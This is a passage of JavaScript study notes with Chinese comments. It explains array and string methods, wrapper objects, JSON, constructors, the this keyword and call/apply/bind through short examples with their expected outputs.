a.slice(-2, -1) // ["b"]
var a = ['a', 'b', 'c'];
a.slice(4) // []
a.slice(2, 1) // []
// slice方法的一个重要应用，是将类似数组的对象转为真正的数组
Array.prototype.slice.call({
    0: 'a',
    1: 'b',
    length: 2
}); // ['a', 'b']
// splice()
// splice方法用于删除原数组的一部分成员，并可以在删除的位置添加新的数组成员，
// 返回值是被删除的元素,该方法会改变原数组
// splice的第一个参数是删除的起始位置（从0开始），第二个参数是被删除的元素个数。
// 如果后面还有更多的参数，则表示这些就是要被插入数组的新元素
var a = ['a', 'b', 'c', 'd', 'e', 'f'];
a.splice(4, 2, 1, 2) // ["e", "f"]
a // ["a", "b", "c", "d", 1, 2]
// 起始位置如果是负数，就表示从倒数位置开始删除
var a = ['a', 'b', 'c', 'd', 'e', 'f'];
a.splice(-4, 2) // ["c", "d"]
// 如果只是单纯地插入元素，splice方法的第二个参数可以设为0
var a = [1, 1, 1];
a.splice(1, 0, 2) // []
a // [1, 2, 1, 1]
// 如果只提供第一个参数，等同于将原数组在指定位置拆分成两个数组
var a = [1, 2, 3, 4];
a.splice(2); // [3, 4]
a; // [1, 2]
// sort()
// sort方法对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。
['d', 'c', 'b', 'a'].sort(); // ['a', 'b', 'c', 'd']
[4, 3, 2, 1].sort(); // [1, 2, 3, 4]
[11, 101].sort(); // [101, 11]
[10111, 1101, 111].sort(); // [10111, 1101, 111]
// 如果想让sort方法按照自定义方式排序，可以传入一个函数作为参数
// sort的参数函数本身接受两个参数，表示进行比较的两个数组成员。如果该函数的返回值大于0，
// 表示第一个成员排在第二个成员后面；其他情况下，都是第一个元素排在第二个元素前面。
[10111, 1101, 111].sort(function (a, b) {
    return a - b;
});
// [111, 1101, 10111]
[{
        name: "张三",
        age: 30
    },
    {
        name: "李四",
        age: 24
    },
    {
        name: "王五",
        age: 28
    }
].sort(function (o1, o2) {
    return o1.age - o2.age;
});
// [
//   { name: "李四", age: 24 },
//   { name: "王五", age: 28  },
//   { name: "张三", age: 30 }
// ]
// map()
// map方法将数组的所有成员依次传入参数函数，然后把每一次的执行结果组成一个新数组返回。
var numbers = [1, 2, 3];
numbers.map(function (n) {
    return n + 1;
}); // [2, 3, 4]
numbers // [1, 2, 3]
// map方法第二个参数，用来绑定回调函数内部的this变量
// 第二个参数，将回调函数内部的this对象，指向arr数组
var arr = ['a', 'b', 'c'];
[1, 2].map(function (e) {
    return this[e];
}, arr); // ['b', 'c']
// 如果数组有空位，map方法的回调函数在这个位置不会执行，会跳过数组的空位
var f = function (n) {
    return 'a'
};
[1, undefined, 2].map(f); // ["a", "a", "a"]
[1, null, 2].map(f); // ["a", "a", "a"]
[1, , 2].map(f); // ["a", , "a"]
// forEach()
// 方法对数组的所有成员依次执行参数函数。但是，forEach方法不返回值，只用来操作数据
// 接受第二个参数，绑定参数函数的this变量
// forEach方法无法中断执行，总是会将所有成员遍历完
var out = [];
[1, 2, 3].forEach(function (elem) {
    this.push(elem * elem);
}, out);
out; // [1, 4, 9]
// filter() 方法不会改变原数组
// filter方法用于过滤数组成员，满足条件的成员组成一个新数组返回
// 参数是一个函数，所有数组成员依次执行该函数，返回结果为true的成员组成一个新数组返回
[1, 2, 3, 4, 5].filter(function (elem) {
    return (elem > 3);
}); // [4, 5]
// filter方法返回数组arr里面所有布尔值为true的成员
var arr = [0, 1, 'a', false];
console.log(arr.filter(Boolean)); // [1, "a"]
// filter方法还可以接受第二个参数，用来绑定参数函数内部的this变量。
var obj = {
    MAX: 3
};
var myFilter = function (item) {
    if (item > this.MAX) return true;
};
var arr = [2, 8, 3, 4, 1, 3, 2, 9];
arr.filter(myFilter, obj) // [8, 4, 9]
// some()，every()
// 返回一个布尔值，表示判断数组成员是否符合某种条件。
// some方法是只要一个成员的返回值是true，则整个some方法的返回值就是true，否则返回false
var arr = [1, 2, 3, 4, 5];
arr.some(function (elem, index, arr) {
    return elem >= 3;
}); // true
// every方法是所有成员的返回值都是true，整个every方法才返回true，否则返回false
var arr = [1, 2, 3, 4, 5];
arr.every(function (elem, index, arr) {
    return elem >= 3;
}); // false
// 对于空数组，some方法返回false，every方法返回true，回调函数都不会执行。
// some和every方法还可以接受第二个参数，用来绑定参数函数内部的this变量
function isEven(x) {
    return x % 2 === 0
};
[].some(isEven); // false
[].every(isEven); // true
// reduce()，reduceRight()
// reduce方法和reduceRight方法依次处理数组的每个成员，最终累计为一个值。
// 它们的差别是，reduce是从左到右处理（从第一个成员到最后一个成员），
// reduceRight则是从右到左（从最后一个成员到第一个成员），其他完全一样
[1, 2, 3, 4, 5].reduce(function (a, b) {
    console.log(a, b);
    return a + b;
});
// 1 2
// 3 3
// 6 4
// 10 5
//最后结果：15
// reduce方法和reduceRight方法的第一个参数都是一个函数。该函数接受以下四个参数
// 这四个参数之中，只有前两个是必须的，后两个则是可选的
// 累积变量，默认为数组的第一个成员
// 当前变量，默认为数组的第二个成员
// 当前位置（从0开始）
// 原数组
// 如果要对累积变量指定初值，可以把它放在reduce方法和reduceRight方法的第二个参数
// 这时b是从数组的第一个成员开始遍历。
[1, 2, 3, 4, 5].reduce(function (a, b) {
    return a + b;
}, 10); // 25
// 由于空数组取不到初始值，reduce方法会报错。这时，加上第二个参数，就能保证总是会返回一个值
function add(prev, cur) {
    return prev + cur;
};
// [].reduce(add);// TypeError: Reduce of empty array with no initial value
[].reduce(add, 1); // 1
// reduce方法相当于3减去2再减去1，reduceRight方法相当于1减去2再减去3
function subtract(prev, cur) {
    return prev - cur;
};
[3, 2, 1].reduce(subtract); // 0
[3, 2, 1].reduceRight(subtract); // -4
// 由于这两个方法会遍历数组，所以实际上还可以用来做一些遍历相关的操作。
// 比如，找出字符长度最长的数组成员。
function findLongest(entries) {
    return entries.reduce(function (longest, entry) {
        return entry.length > longest.length ? entry : longest;
    }, '');
};
findLongest(['aaa', 'bb', 'c']); // "aaa"
// indexOf()，lastIndexOf()
// indexOf方法返回给定元素在数组中第一次出现的位置，如果没有出现则返回-1
var a = ['a', 'b', 'c'];
a.indexOf('b'); // 1
a.indexOf('y'); // -1
// indexOf方法还可以接受第二个参数，表示搜索的开始位置
['a', 'b', 'c'].indexOf('a', 1); // -1
// lastIndexOf方法返回给定元素在数组中最后一次出现的位置，如果没有出现则返回-1
var a = [2, 5, 9, 2];
a.lastIndexOf(2); // 3
a.lastIndexOf(7); // -1
// 这两个方法不能用来搜索NaN的位置，即它们无法确定数组成员是否包含NaN。
// 因为这两个方法内部，使用严格相等运算符（===）进行比较，而NaN是唯一一个不等于自身的值
[NaN].indexOf(NaN); // -1
[NaN].lastIndexOf(NaN); // -1
// 链式使用 
// 数组方法之中，有不少返回的还是数组，所以可以链式使用
var users = [{
        name: 'tom',
        email: 'tom@example.com'
    },
    {
        name: 'peter',
        email: 'peter@example.com'
    }
];
users
    .map(function (user) {
        return user.email;
    })
    .filter(function (email) {
        return /^t/.test(email);
    })
    .forEach(function (email) {
        console.log(email);
    }); // "tom@example.com"
// 包装对象
// 指的是与数值、字符串、布尔值分别相对应的Number、String、Boolean三个原生对象
// 三个原生对象作为普通函数调用，常常用于将任意类型的值转为数值、字符串和布尔值。
// 作为构造函数使用（带有new）时，可以将原始类型的值转为对象
// 设计目的
// 使得“对象”这种类型可以覆盖 JavaScript 所有的值，整门语言有一个通用的数据模型
// 使得原始类型的值也有办法调用自己的方法
// 实例方法
// valueOf()
// valueOf()方法返回包装对象实例对应的原始类型的值
new Number(123).valueOf(); // 123
new String('abc').valueOf(); // "abc"
new Boolean(true).valueOf(); // true
// toString()
// toString()方法返回对应的字符串形式
new Number(123).toString(); // "123"
new String('abc').toString(); // "abc"
new Boolean(true).toString(); // "true"
// 原始类型与实例对象的自动转换 
// 某些场合，原始类型的值会自动当作包装对象调用，即调用包装对象的属性和方法。
// 这时，JavaScript 引擎会自动将原始类型的值转为包装对象实例，并在使用后立刻销毁实例。
// 自动转换生成的包装对象是只读的，无法修改
'abc'.length; // 3
// 自定义方法
// 除了原生的实例方法，包装对象还可以自定义方法和属性，供原始类型的值直接调用
// Boolean 对象
// 因为所有对象对应的布尔值都是true,false对应的包装对象实例是一个对象
new Boolean(false); // true
// Number 对象
// 静态属性
// 实例方法  有4个实例方法，都跟将数值转换成指定格式有关
// Number.prototype.toString()
// toString方法只能将十进制的数，转为其他进制的字符串
// 如果要将其他进制的数，转回十进制，需要使用parseInt方法
(10).toString(2); // "1010"
(10).toString(8); // "12"
(10).toString(16); // "a"
// Number.prototype.toFixed()
// toFixed()方法先将一个数转为指定位数的小数，然后返回这个小数对应的字符串
// toFixed()方法的参数为小数位数，有效范围为0到20，超出这个范围将抛出 RangeError 错误
// 由于浮点数的原因，小数5的四舍五入是不确定的，使用的时候必须小心
(10).toFixed(2); // "10.00"
(10.055).toFixed(2); // 10.05
(10.005).toFixed(2); // 10.01
// String 对象
// 字符串对象是一个类似数组的对象
// 静态方法
// String.fromCharCode()
// 该方法的参数是一个或多个数值，代表 Unicode 码点，返回值是这些码点组成的字符串
// 该方法不支持 Unicode 码点大于0xFFFF的字符，即传入的参数不能大于0xFFFF（即十进制的 65535）
String.fromCharCode(); // ""
String.fromCharCode(97); // "a"
String.fromCharCode(104, 101, 108, 108, 111); // "hello"
// 实例属性
// String.prototype.length
// 实例方法
// String.prototype.charAt()
// charAt方法返回指定位置的字符，参数是从0开始编号的位置
// 如果参数为负数，或大于等于字符串的长度，charAt返回空字符串
// 这个方法完全可以用数组下标替代
var s = new String('abc');
s.charAt(1); // "b"
s.charAt(s.length - 1); // "c"
'abc'.charAt(-1); // ""
'abc'.charAt(3); // ""
'abc'.charAt(1); // "b"
'abc' [1]; // "b"
// String.prototype.charCodeAt()
// charCodeAt方法返回字符串指定位置的 Unicode 码点（十进制表示）
// ，相当于String.fromCharCode()的逆操作
// 如果参数为负数，或大于等于字符串的长度，charCodeAt返回NaN
'abc'.charCodeAt(1); // 98
// String.prototype.concat()
// concat方法用于连接两个字符串，返回一个新字符串，不改变原字符串
// 可以接受多个参数
// 如果参数不是字符串，concat方法会将其先转为字符串，然后再连接
var s1 = 'abc';
var s2 = 'def';
s1.concat(s2); // "abcdef"
s1; // "abc"
'a'.concat('b', 'c'); // "abc"
var one = 1;
var two = 2;
var three = '3';
''.concat(one, two, three); // "123"
// String.prototype.slice()
// 方法用于从原字符串取出子字符串并返回，不改变原字符串。它的
// 第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）
// 如果省略第二个参数，则表示子字符串一直到原字符串结束
// 如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度
// 如果第一个参数大于第二个参数，slice方法返回一个空字符串
'JavaScript'.slice(0, 4); // "Java"
'JavaScript'.slice(4); // "Script"
'JavaScript'.slice(-6); // "Script"
'JavaScript'.slice(0, -6); // "Java"
'JavaScript'.slice(-2, -1); // "p"
'JavaScript'.slice(2, 1); // ""
// String.prototype.substr() 
// 跟slice和substring方法的作用相同。
// 第一个参数是子字符串的开始位置（从0开始计算），第二个参数是子字符串的长度。
// 如果省略第二个参数，则表示子字符串一直到原字符串的结束。
// 如果第一个参数是负数，表示倒数计算的字符位置。
// 如果第二个参数是负数，将被自动转为0，因此会返回空字符串。
'JavaScript'.substr(4, 6); // "Script"
'JavaScript'.substr(4); // "Script"
'JavaScript'.substr(-6); // "Script"
'JavaScript'.substr(4, -1); // ""
// String.prototype.indexOf()，String.prototype.lastIndexOf()
// indexOf方法用于确定一个字符串在另一个字符串中第一次出现的位置，
// 返回结果是匹配开始的位置。如果返回-1，就表示不匹配
// indexOf方法还可以接受第二个参数，表示从该位置开始向后匹配。
'hello world'.indexOf('o'); // 4
'JavaScript'.indexOf('script'); // -1
'hello world'.indexOf('o', 6); // 7
// lastIndexOf方法的用法跟indexOf方法一致，
// 主要的区别是lastIndexOf从尾部开始匹配，indexOf则是从头部开始匹配
// lastIndexOf的第二个参数表示从该位置起向前匹配。
'hello world'.lastIndexOf('o'); // 7
'hello world'.lastIndexOf('o', 6); // 4
console.log('hello world'.lastIndexOf('or', 7)); // 7
// String.prototype.trim() 
// trim方法用于去除字符串两端的空格，返回一个新字符串，不改变原字符串。
'  hello world  '.trim(); // "hello world"
'\r\nabc \t'.trim(); // 'abc'
// String.prototype.toLowerCase()，String.prototype.toUpperCase()
// 返回一个新字符串，不改变原字符串
// String.prototype.match()
// match方法用于确定原字符串是否匹配某个子字符串，返回一个数组，
// 成员为匹配的第一个字符串。如果没有找到匹配，则返回null
// 返回的数组还有index属性和input属性，分别表示匹配字符串开始的位置和原始字符串。
// match方法还可以使用正则表达式作为参数
'cat, bat, sat, fat'.match('at'); // ["at"]
'cat, bat, sat, fat'.match('xt'); // null
var matches = 'cat, bat, sat, fat'.match('at');
matches.index; // 1
matches.input; // "cat, bat, sat, fat"
// String.prototype.search()，String.prototype.replace()
// search方法的用法基本等同于match，但是返回值为匹配的第一个位置。
// 如果没有找到匹配，则返回-1
// search方法还可以使用正则表达式作为参数
'cat, bat, sat, fat'.search('at'); // 1
// replace方法用于替换匹配的子字符串，
// 一般情况下只替换第一个匹配（除非使用带有g修饰符的正则表达式）
'aaa'.replace('a', 'b'); // "baa"
// String.prototype.split() 
// split方法按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组
// 如果分割规则为空字符串，则返回数组的成员是原字符串的每一个字符。
// 如果省略参数，则返回数组的唯一成员就是原字符串。
// 如果两个分割符中间没有其他字符，则返回数组之中会有一个空字符串
// split方法还可以接受第二个参数，限定返回数组的最大成员数
// split方法还可以使用正则表达式作为参数
'a|b|c'.split('|'); // ["a", "b", "c"]
'a|b|c'.split(''); // ["a", "|", "b", "|", "c"]
'a|b|c'.split(); // ["a|b|c"]
'a||c'.split('|'); // ['a', '', 'c']
'a|b|c'.split('|', 0); // []
'a|b|c'.split('|', 1); // ["a"]
'a|b|c'.split('|', 2); // ["a", "b"]
'a|b|c'.split('|', 3); // ["a", "b", "c"]
'a|b|c'.split('|', 4); // ["a", "b", "c"]
// String.prototype.localeCompare()
// localeCompare方法用于比较两个字符串。它返回一个整数，
// 如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；
// 如果大于0，表示第一个字符串大于第二个字符串。
// 该方法的最大特点，就是会考虑自然语言的顺序
'B'.localeCompare('a'); // 1
// Math 对象
// Math.random() 
// 返回0到1之间的一个伪随机数，可能等于0，但是一定小于1
// 任意范围的随机数生成函数
function getRandomArbitrary(min, max) {
    return Math.random() * (max - min) + min;
};
// 任意范围的随机整数生成函数
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
};
// JSON 对象
// JSON 格式
// JSON 对值的类型和格式有严格的规定
// 复合类型的值只能是数组或对象，不能是函数、正则表达式对象、日期对象。
// 原始类型的值只有四种：字符串、数值（必须以十进制表示）、布尔值和null
// 字符串必须使用双引号表示，不能使用单引号。
// 对象的键名必须放在双引号里面。
// 数组或对象最后一个成员的后面，不能加逗号。
// JSON 对象
// JSON对象是 JavaScript 的原生对象，用来处理 JSON 格式数据。
// 它有两个静态方法：JSON.stringify()和JSON.parse()
// JSON.stringify()
// SON.stringify方法用于将一个值转为 JSON 字符串。
// 该字符串符合 JSON 格式，并且可以被JSON.parse方法还原。
JSON.stringify('abc'); // ""abc""
JSON.stringify(1); // "1"
JSON.stringify(false); // "false"
JSON.stringify([]); // "[]"
JSON.stringify({}); // "{}"
JSON.stringify([1, "false", false]); // '[1,"false",false]'
JSON.stringify({
    name: "张三"
}); // '{"name":"张三"}'
// JSON.stringify方法还可以接受一个数组，作为第二个参数，指定需要转成字符串的属性。
// 只对对象的属性有效，对数组无效
var obj = {
    'prop1': 'value1',
    'prop2': 'value2',
    'prop3': 'value3'
};
var selectedProperties = ['prop1', 'prop2'];
JSON.stringify(obj, selectedProperties); // "{"prop1":"value1","prop2":"value2"}"
// 第二个参数还可以是一个函数，用来更改JSON.stringify的返回值
// 函数接受两个参数，分别是被转换的对象的键名和键值
// 这个处理函数是递归处理所有的键
function f(key, value) {
    if (typeof value === "number") {
        value = 2 * value;
    }
    return value;
};
JSON.stringify({
    a: 1,
    b: 2
}, f); // '{"a": 2,"b": 4}'
// 如果处理函数返回undefined或没有返回值，则该属性会被忽略
function f(key, value) {
    if (typeof (value) === "string") {
        return undefined;
    }
    return value;
};
JSON.stringify({
    a: "abc",
    b: 123
}, f); // '{"b": 123}'
// JSON.stringify还可以接受第三个参数，用于增加返回的 JSON 字符串的可读性
// 如果是数字，表示每个属性前面添加的空格（最多不超过10个）；
// 如果是字符串（不超过10个字符），则该字符串会添加在每行前面。
JSON.stringify({
    p1: 1,
    p2: 2
}, null, 2);
/*
"{
  "p1": 1,
  "p2": 2
}"
*/
JSON.stringify({
    p1: 1,
    p2: 2
}, null, '|-');
/*
"{
|-"p1": 1,
|-"p2": 2
}"
*/
// 参数对象的 toJSON 方法
// 如果参数对象有自定义的toJSON方法，那么JSON.stringify会
// 使用这个方法的返回值作为参数，而忽略原对象的其他属性。
var user = {
    firstName: '三',
    lastName: '张',
    get fullName() {
        return this.lastName + this.firstName;
    },
    toJSON: function () {
        return {
            name: this.lastName + this.firstName
        };
    }
};
JSON.stringify(user); // "{"name":"张三"}"
// JSON.parse() 
// JSON.parse方法用于将 JSON 字符串转换成对应的值
// 为了处理解析错误，可以将JSON.parse方法放在try...catch代码块中
try {
    JSON.parse("'String'");
} catch (e) {
    console.log('parsing error');
};
// JSON.parse方法可以接受一个处理函数，作为第二个参数，用法与JSON.stringify方法类似。
function f(key, value) {
    if (key === 'a') {
        return value + 10;
    }
    return value;
};
JSON.parse('{"a": 1, "b": 2}', f); // {a: 11, b: 2}
// =====
// 面向对象编程
// 构造函数
// 面向对象编程的第一步，就是要生成对象
// JavaScript 语言的对象体系，不是基于“类”的，
// 而是基于构造函数（constructor）和原型链（prototype）
// JavaScript 语言使用构造函数（constructor）作为对象的模板
// 构造函数的两个特点
// 函数体内部使用了this关键字，代表了所要生成的对象实例。
// 生成对象的时候，必须使用new命令。
// new 命令 
// 基本用法
// new命令的作用，就是执行构造函数，返回一个实例对象
// 使用new命令时，根据需要，构造函数也可以接受参数
// new命令本身就可以执行构造函数，所以后面的构造函数可以带括号，也可以不带括号。
var Vehicle = function (p) {
    this.price = p;
};
// 推荐的写法
var v = new Vehicle();
// 不推荐的写法
var v = new Vehicle;
// 构造函数内部判断是否使用new命令，如果发现没有使用，则直接返回一个实例对象
function Fubar(foo, bar) {
    if (!(this instanceof Fubar)) {
        return new Fubar(foo, bar);
    };
    this._foo = foo;
    this._bar = bar;
};
Fubar(1, 2)._foo; // 1
(new Fubar(1, 2))._foo; // 1
// --------------------
function aa2() {
    console.log(111);
};
aa2.prototype = {
    bb: "bbb"
};
aa2.prototype.constructor = aa2;
var aa3 = new aa2();
console.log(aa3);
console.log(aa3.__proto__ === aa2.prototype);
// new 命令的原理 
// 使用new命令时，它后面的函数依次执行下面的步骤
// 创建一个空对象，作为将要返回的对象实例。
// 将这个空对象的原型，指向构造函数的prototype属性。
// 将这个空对象赋值给函数内部的this关键字。
// 开始执行构造函数内部的代码。
// 如果构造函数内部有return语句，而且return后面跟着一个对象，
// new命令会返回return语句指定的对象；否则，就会不管return语句，返回this对象
var Vehicle = function () {
    this.price = 1000;
    return 1000;
};
(new Vehicle()) === 1000; // false
// 如果对普通函数（内部没有this关键字的函数）使用new命令，则会返回一个空对象。
function getMessage() {
    return 'this is a message';
}
var msg = new getMessage();
msg; // {}
typeof msg; // "object"
// new命令简化的内部流程
function _new( /* 构造函数 */ constructor, /* 构造函数参数 */ params) {
    // 将 arguments 对象转为数组
    var args = [].slice.call(arguments);
    // 取出构造函数
    var constructor = args.shift();
    // 创建一个空对象，继承构造函数的 prototype 属性
    var context = Object.create(constructor.prototype);
    // 执行构造函数
    var result = constructor.apply(context, args);
    // 如果返回结果是对象，就直接返回，否则返回 context 对象
    return (typeof result === 'object' && result != null) ? result : context;
};
// 实例
// var actor = _new(Person, '张三', 28);
// new.target
// 函数内部可以使用new.target属性。如果当前函数是new命令调用，
// new.target指向当前函数，否则为undefined。
function f() {
    console.log(new.target === f);
};

f(); // false
new f(); // true
// 使用这个属性，可以判断函数调用的时候，是否使用new命令
function f() {
    if (!new.target) {
        throw new Error('请使用 new 命令调用！');
    }
    // ...
};
f(); // Uncaught Error: 请使用 new 命令调用！
// Object.create() 创建实例对象
// 构造函数作为模板，可以生成实例对象。但是，有时拿不到构造函数，只能拿到一个现有的对象。
// 我们希望以这个现有的对象作为模板，生成新的实例对象，这时就可以使用Object.create()方法
var person1 = {
    name: '张三',
    age: 38,
    greeting: function () {
        console.log('Hi! I\'m ' + this.name + '.');
    }
};
var person2 = Object.create(person1);
person2.name; // 张三
person2.greeting(); // Hi! I'm 张三.
// =====
// this 关键字
// this就是属性或方法“当前”所在的对象
// 由于对象的属性可以赋给另一个对象，所以属性所在的当前对象是可变的，即this的指向是可变的
// 只要函数被赋给另一个变量，this的指向就会变
var A = {
    name: '张三',
    describe: function () {
        return '姓名：' + this.name;
    }
};

var B = {
    name: '李四'
};
B.describe = A.describe;
B.describe(); // "姓名：李四"
// 稍稍重构这个例子，this的动态指向就能看得更清楚。
function f() {
    return '姓名：' + this.name;
};
var A = {
    name: '张三',
    describe: f
};
var B = {
    name: '李四',
    describe: f
};
A.describe(); // "姓名：张三"
B.describe(); // "姓名：李四"
// JavaScript 语言之中，一切皆对象，运行环境也是对象，
// 所以函数都是在某个对象之中运行，this就是函数运行时所在的对象（环境）
// 实质
// JavaScript 语言之所以有 this 的设计，跟内存里面的数据结构有关系
// 将一个对象赋值给变量,JavaScript 引擎会先在内存里面，
// 生成一个对象,然后把这个对象的内存地址赋值给变量
// 当对象属性值是函数时，引擎会将函数单独保存在内存中，然后再将
// 函数的地址赋值给属性的属性描述对象的value
// 由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行
var f = function () {};
var obj = {
    f: f
}; // 单独执行
f(); // obj 环境执行
obj.f();
// JavaScript 允许在函数体内部，引用当前环境的其他变量
// 函数体里面使用了变量x。该变量由运行环境提供
var f = function () {
    console.log(x);
};
// 由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在函数体内部
// 获得当前的运行环境（context）。所以，this就出现了，
// 它的设计目的就是在函数体内部，指代函数当前的运行环境
var f = function () {
    console.log(this.x);
};
var x = 1;
var obj = {
    f: f,
    x: 2,
};
// 单独执行
f(); // 1
// obj 环境执行
obj.f(); // 2
// this使用场合
// 全局环境
// 全局环境使用this，它指的就是顶层对象window
this === window; // true
function f() {
    console.log(this === window);
};
f(); // true
// 构造函数
// 构造函数中的this，指的是实例对象
var Obj = function (p) {
    this.p = p;
};
// 对象的方法
// 如果对象的方法里面包含this，this的指向就是方法运行时所在的对象。
// 该方法赋值给另一个对象，就会改变this的指向
// 下面这几种用法，都会改变this的指向,obj.foo就是一个值
// 可以这样理解，JavaScript 引擎内部，obj和obj.foo储存在两个内存地址，
// 称为地址一和地址二。obj.foo()这样调用时，是从地址一调用地址二，
// 因此地址二的运行环境是地址一，this指向obj。
// 但是，三种情况，都是直接取出地址二进行调用，这样的话，运行环境就是全局环境
// 情况一
// (obj.foo = obj.foo)(); // window
// 情况二
// (false || obj.foo)(); // window
// 情况三
// (1, obj.foo)();// window
// 如果this所在的方法不在对象的第一层，这时this只是指向
// 当前一层的对象，而不会继承更上面的层
var a = {
    p: 'Hello',
    b: {
        m: function () {
            console.log(this.p);
        }
    }
};
a.b.m(); // undefined
// 使用注意点
// 避免多层 this
// 解决方法是在第二层改用一个指向外层this的变量
var o = {
    f1: function () {
        console.log(this);
        var that = this;
        var f2 = function () {
            console.log(that);
        }();
    }
};
// 避免数组处理方法中的 this 
// 数组的map和foreach方法，允许提供一个函数作为参数。这个函数内部不应该使用this
// 解决这个问题的一种方法使用中间变量固定this
var o = {
    v: 'hello',
    p: ['a1', 'a2'],
    f: function f() {
        var that = this;
        this.p.forEach(function (item) {
            console.log(that.v + ' ' + item);
        });
    }
};
// 另一种方法是将this当作foreach方法的第二个参数，固定它的运行环境
var o = {
    v: 'hello',
    p: ['a1', 'a2'],
    f: function f() {
        this.p.forEach(function (item) {
            console.log(this.v + ' ' + item);
        }, this);
    }
};
// 避免回调函数中的 this
// 回调函数中的this往往会改变指向，最好避免使用
// 为了解决这个问题，可以采用下面的一些方法对this进行绑定，
// 也就是使得this固定指向某个对象，减少不确定性
// JavaScript 提供了call、apply、bind这三个方法，来切换/固定this的指向。
// apply方法（或者call方法）不仅绑定函数执行时所在的对象，还会立即执行函数
// Function.prototype.call()
// 函数实例的call方法，可以指定函数内部this的指向（即函数执行时所在的作用域），
// 然后在所指定的作用域中，调用该函数
// call方法可以改变this的指向，指定this指向对象obj，然后在对象obj的作用域中运行函数f
var obj = {};
var f = function () {
    return this;
};
f() === window; // true
f.call(obj) === obj; // true
// call方法的参数，应该是一个对象。如果参数为空、null和undefined，则默认传入全局对象。
var n = 123;
var obj = {
    n: 456
};

function a1() {
    console.log(this.n);
};
a1.call(); // 123
a1.call(null); // 123
a1.call(undefined); // 123
a1.call(window); // 123
a1.call(obj); // 456
// 如果call方法的参数是一个原始值，那么这个原始值会自动转成对应的包装对象，然后传入call方法。
var f = function () {
    return this;
};
f.call(5);
// call方法还可以接受多个参数,第一个参数就是this所要指向的那个对象，
// 后面的参数则是函数调用时所需的参数
function add(a, b) {
    return a + b;
};
add.call(this, 1, 2); // 3
// call方法的一个应用是调用对象的原生方法
var obj = {};
obj.hasOwnProperty('toString'); // false
// 覆盖掉继承的 hasOwnProperty 方法
obj.hasOwnProperty = function () {
    return true;
};
obj.hasOwnProperty('toString'); // true
Object.prototype.hasOwnProperty.call(obj, 'toString'); // false
// Function.prototype.apply()
// apply方法的作用与call方法类似，也是改变this指向，然后再调用该函数。
// 唯一的区别就是，它接收一个数组作为函数执行时的参数
// apply方法的第一个参数也是this所要指向的那个对象，
// 如果设为null或undefined，则等同于指定全局对象
function f(x, y) {
    console.log(x + y);
};
f.call(null, 1, 1); // 2
f.apply(null, [1, 1]); // 2
// 有趣的应用
// 找出数组最大元素
var a = [10, 2, 4, 15, 9];
Math.max.apply(null, a); // 15
// 将数组的空元素变为undefined
Array.apply(null, ['a', , 'b']); // [ 'a', undefined, 'b' ]
// 空元素与undefined的差别在于，数组的forEach方法会跳过空元素，但是不会跳过undefined
// 转换类似数组的对象
// 方法起作用的前提是，被处理的对象必须有length属性，以及相对应的数字键。
Array.prototype.slice.apply({
    0: 1,
    length: 1
}); // [1]
Array.prototype.slice.apply({
    0: 1
}); // []
Array.prototype.slice.apply({
    0: 1,
    length: 2
}); // [1, undefined]
Array.prototype.slice.apply({
    length: 1
}); // [undefined]
// 绑定回调函数的对象
var o = new Object();
o.f = function () {
    console.log(this === o);
};
var f2 = function () {
    o.f.apply(o);
    // 或者 o.f.call(o);
};
// $('#button').on('click', f);
// Function.prototype.bind()
// bind方法用于将函数体内的this绑定到某个对象，然后返回一个新函数
var counter = {
    count: 0,
    inc: function () {
        this.count++;
    }
};
var func = counter.inc.bind(counter);
func();
counter.count; // 1
// this绑定到其他对象也是可以的
var counter = {
    count: 0,
    inc: function () {
        this.count++;
    }
};
var obj = {
    count: 100
};
var func = counter.inc.bind(obj);
func();
obj.count; // 101
// bind还可以接受更多的参数，将这些参数绑定原函数的参数
var add = function (x, y) {
    return x * this.m + y * this.n;
}
var obj = {
    m: 2,
    n: 2
};
var newAdd = add.bind(obj, 5);
newAdd(5); // 20
// 如果bind方法的第一个参数是null或undefined，
// 等于将this绑定到全局对象，函数运行时this指向顶层对象
// bind方法有一些使用注意点
// 每一次返回一个新函数
// var listener = o.m.bind(o);
// element.addEventListener('click', listener);
// element.removeEventListener('click', listener);
// 结合回调函数使用
// 1.
var counter = {
    count: 0,
    inc: function () {
        'use strict';
        this.count++;
    }
};

function callIt(callback) {
    callback();
};
callIt(counter.inc.bind(counter));
counter.count; // 1
// 2.数组方法中this指向问题
obj.print = function () {
    // this.times.forEach(function (n) {
    //     console.log(this.name);
    // }.bind(this));
};

obj.print();
// 张三
// 张三
// 张三
//  结合call方法使用
// 数组的slice方法从[1, 2, 3]里面，按照指定位置和长度切分出另一个数组。
// 这样做的本质是在[1, 2, 3]上面调用Array.prototype.slice方法，
// 因此可以用call方法表达这个过程，得到同样的结果
[1, 2, 3].slice(0, 1); // [1]
// 等同于
Array.prototype.slice.call([1, 2, 3], 0, 1); // [1]
// call方法实质上是调用Function.prototype.call方法，因此上面的表达式可以用bind方法改写
var slice = Function.prototype.call.bind(Array.prototype.slice);
slice([1, 2, 3], 0, 1) // [1]
// 上面代码的含义就是，将Array.prototype.slice变成Function.prototype.call方法所在的对象，
// 调用时就变成了Array.prototype.slice.call
// 类似的写法还可以用于其他数组方法。
var push = Function.prototype.call.bind(Array.prototype.push);
var pop = Function.prototype.call.bind(Array.prototype.pop);
var a = [1, 2, 3];
push(a, 4);
a; // [1, 2, 3, 4]
pop(a);
a; // [1, 2, 3]
// 如果再进一步，将Function.prototype.call方法绑定
// 到Function.prototype.bind对象，就意味着bind的调用形式也可以被改写。
function f01() {
    console.log(this.vc);
};
var oo = {
    vc: 123
};
var bind = Function.prototype.call.bind(Function.prototype.bind);
// bind(f01,oo)(); // 123
// 上面代码的含义就是，将Function.prototype.bind方法绑定在Function.prototype.call上面，
// 所以bind方法就可以直接使用，不需要在函数实例上使用
// =====
// 对象的继承
// 原型对象概述
// 构造函数的缺点
// 同一个构造函数的多个实例之间，无法共享属性，从而造成对系统资源的浪费
// 这个问题的解决方法，就是 JavaScript 的原型对象（prototype）
// prototype 属性的作用
// JavaScript 继承机制的设计思想就是，原型对象的
// 所有属性和方法，都能被实例对象共享
